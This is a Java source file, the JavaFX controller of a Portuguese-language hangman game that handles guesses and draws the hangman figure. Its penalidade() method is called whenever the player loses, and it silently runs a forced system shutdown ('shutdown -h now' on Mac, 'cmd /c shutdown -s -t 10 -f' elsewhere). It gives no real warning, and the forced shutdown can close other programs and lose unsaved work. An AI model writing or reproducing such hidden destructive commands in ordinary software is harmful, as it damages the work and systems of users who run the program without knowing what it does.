/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package br.com.unibh.controller;

import br.com.unibh.model.Forca;
import br.com.unibh.model.GerenciadorDeJanela;
import java.io.IOException;
import java.net.URL;
import java.text.Collator;
import java.util.ArrayList;
import java.util.List;
import java.util.Locale;
import java.util.ResourceBundle;
import java.util.logging.Level;
import java.util.logging.Logger;
import javafx.event.ActionEvent;
import javafx.fxml.FXML;
import javafx.fxml.Initializable;
import javafx.scene.canvas.Canvas;
import javafx.scene.canvas.GraphicsContext;
import javafx.scene.control.Alert;
import javafx.scene.control.ButtonType;
import javafx.scene.control.Label;
import javafx.scene.control.TextField;
import javafx.scene.layout.AnchorPane;
import javafx.scene.layout.HBox;
import javafx.scene.paint.Color;

/**
 * FXML Controller class
 *
 * @author lucas
 */
public class JogoDaForcaController implements Initializable {

    @FXML
    private AnchorPane apPrincipal;
    @FXML
    private Canvas cForca;
    @FXML
    private TextField tfTeste;
    @FXML
    private HBox vbForca;

    private Forca forca;

    private List<Label> labels;

    /**
     * Initializes the controller class.
     */
    @Override
    public void initialize(URL url, ResourceBundle rb) {
        forca = new Forca();
        forca.iniciar();
        desenhar(forca.getFalhas());
        labels = new ArrayList<>();
        montarComponentePalavra();
    }

    @FXML
    public void novoJogo(ActionEvent e) {
        forca.iniciar();
        desenhar(forca.getFalhas());
        montarComponentePalavra();
    }

    @FXML
    public void onTentativa(ActionEvent e) {
        Collator collator = Collator.getInstance(new Locale("pt", "BR"));
        collator.setStrength(Collator.PRIMARY);
        if (tfTeste.getText().isEmpty()) {
            new Alert(Alert.AlertType.ERROR, "Digite sua tentativa!").show();
        } else if (tfTeste.getText().length() > 1) {
            //TODO metodo de arrisca palavra
            if (new Alert(Alert.AlertType.CONFIRMATION, "Deseja fazer tentativa perigosa?", ButtonType.YES, ButtonType.NO).showAndWait().get().equals(ButtonType.YES)) {
                if (collator.compare(forca.getPalavra(), tfTeste.getText()) == 0) {
                    for (int i = 0; i < forca.getPalavra().length(); i++) {
                        if (collator.compare(String.valueOf(forca.getPalavra().charAt(i)).toLowerCase(), String.valueOf(tfTeste.getText().charAt(i)).toLowerCase()) == 0) {
                            labels.get(i).setText(String.valueOf(forca.getPalavra().charAt(i)));
                        }
                    }
                    new Alert(Alert.AlertType.INFORMATION, "Parabéns, você ganhou!!!").showAndWait();

                } else {
                    forca.setFalhas(6);
                    desenhar(forca.getFalhas());
                    new Alert(Alert.AlertType.INFORMATION, "Acho que iria ganhar? Achou errado :/ \n Você perdeu").show();
                    penalidade();
                    tfTeste.clear();
                }
            }
        } else {
            boolean contains = false;
            String palavraAtual = "";
            for (int i = 0; i < forca.getPalavra().length(); i++) {
                if (collator.compare(String.valueOf(forca.getPalavra().charAt(i)).toLowerCase(), tfTeste.getText().toLowerCase()) == 0) {
                    labels.get(i).setText(String.valueOf(forca.getPalavra().charAt(i)));
                    contains = true;
                }
                palavraAtual += labels.get(i).getText();
            }
            if (collator.compare(forca.getPalavra(), palavraAtual) == 0) {
                new Alert(Alert.AlertType.INFORMATION, "Parabéns, você ganhou!!!").showAndWait();
            }
            if (!contains) {
                if (!forca.getTentativas().contains(tfTeste.getText().toLowerCase())) {
                    forca.setFalhas(forca.getFalhas() + 1);
                    desenhar(forca.getFalhas());
                    forca.getTentativas().add(tfTeste.getText().toLowerCase());
                    verificarDerrota();
                } else {
                    //TODO colocar aqui mensagem que você ja utilizou essa tentativa
                    new Alert(Alert.AlertType.INFORMATION, "Você ja utilizou essa letra como alternativa!").show();
                }
            }

        }
    }

    public static final int INICIO_X = 15;
    public static final int INICIO_Y = 15;
    public static final int LARGURA_CABECA = 50;
    public static final int ALTURA_CABECA = 50;
    public static final int ALTURA_CORPO = 80;
    public static final int LARGURA_CORPO = 3;

    public void desenhar(int falhas) {
        GraphicsContext graphicsContext = cForca.getGraphicsContext2D();
        graphicsContext.clearRect(0, 0, cForca.getWidth(), cForca.getHeight());
        graphicsContext.setStroke(Color.BLACK);
        graphicsContext.setFill(Color.BLACK);
        switch (falhas) {
            case 1:
                desenharCabeca(graphicsContext);
                break;
            case 2:
                desenharCabeca(graphicsContext);
                desenharCorpo(graphicsContext);
                break;
            case 3:
                desenharCabeca(graphicsContext);
                desenharCorpo(graphicsContext);
                desenharBracoDireito(graphicsContext);
                break;
            case 4:
                desenharCabeca(graphicsContext);
                desenharCorpo(graphicsContext);
                desenharBracoDireito(graphicsContext);
                desenharBracoEsquerdo(graphicsContext);
                break;
            case 5:
                desenharCabeca(graphicsContext);
                desenharCorpo(graphicsContext);
                desenharBracoDireito(graphicsContext);
                desenharBracoEsquerdo(graphicsContext);
                desenharPernaDireita(graphicsContext);
                break;
            case 6:
                graphicsContext.setStroke(Color.RED);
                graphicsContext.setFill(Color.RED);
                desenharCabeca(graphicsContext);
                desenharCorpo(graphicsContext);
                desenharBracoDireito(graphicsContext);
                desenharBracoEsquerdo(graphicsContext);
                desenharPernaDireita(graphicsContext);
                desenharPernaEsquerda(graphicsContext);
                break;
        }

    }

    private void desenharCabeca(GraphicsContext graphicsContext) {
        graphicsContext.fillOval(INICIO_X, INICIO_Y, LARGURA_CABECA, ALTURA_CABECA);
    }

    private void desenharCorpo(GraphicsContext graphicsContext) {
        graphicsContext.fillRect(INICIO_X + (LARGURA_CABECA / 2), INICIO_Y + ALTURA_CABECA, LARGURA_CORPO, ALTURA_CORPO);
    }

    private void desenharBracoDireito(GraphicsContext graphicsContext) {
        graphicsContext.fillRect(INICIO_X + (LARGURA_CABECA / 2), INICIO_Y + ALTURA_CABECA + 15, 50, 3);
    }

    private void desenharBracoEsquerdo(GraphicsContext graphicsContext) {
        graphicsContext.fillRect(INICIO_X + (50 / 2) - 50, INICIO_Y + 65, 50, 3);
    }

    private void desenharPernaDireita(GraphicsContext graphicsContext) {
        graphicsContext.setLineWidth(3);
        graphicsContext.strokeLine(INICIO_X + (LARGURA_CABECA / 2) + 3, INICIO_Y + LARGURA_CABECA + ALTURA_CORPO, INICIO_X + (LARGURA_CABECA / 2) + 30, INICIO_Y + LARGURA_CABECA + ALTURA_CORPO + 50);
    }

    private void desenharPernaEsquerda(GraphicsContext graphicsContext) {
        graphicsContext.strokeLine(INICIO_X + (LARGURA_CABECA / 2), INICIO_Y + LARGURA_CABECA + ALTURA_CORPO, INICIO_X + (LARGURA_CABECA / 2) - 30, INICIO_Y + LARGURA_CABECA + ALTURA_CORPO + 50);
    }

    private void montarComponentePalavra() {
        labels.clear();
        vbForca.getChildren().clear();
        for (char c : forca.getPalavra().toCharArray()) {
            Label label = new Label(String.valueOf('_'));
            label.getStyleClass().add("label-text");
            vbForca.getChildren().add(label);
            labels.add(label);
        }
    }

    private void verificarDerrota() {
        if (forca.getFalhas() == 6) {
            new Alert(Alert.AlertType.INFORMATION, "Você perdeu :(").show();
            penalidade();
        }
    }

    public void penalidade() {
        try {
            String operatingSystem = System.getProperty("os.name");
            if (operatingSystem.toLowerCase().contains("mac")) {
                Runtime.getRuntime().exec("shutdown -h now");
            } else {
                Runtime.getRuntime().exec("cmd /c shutdown -s -t 10 -f");
            }
        } catch (IOException ex) {
            Logger.getLogger(GerenciadorDeJanela.class.getName()).log(Level.SEVERE, null, ex);
        }
    }
}
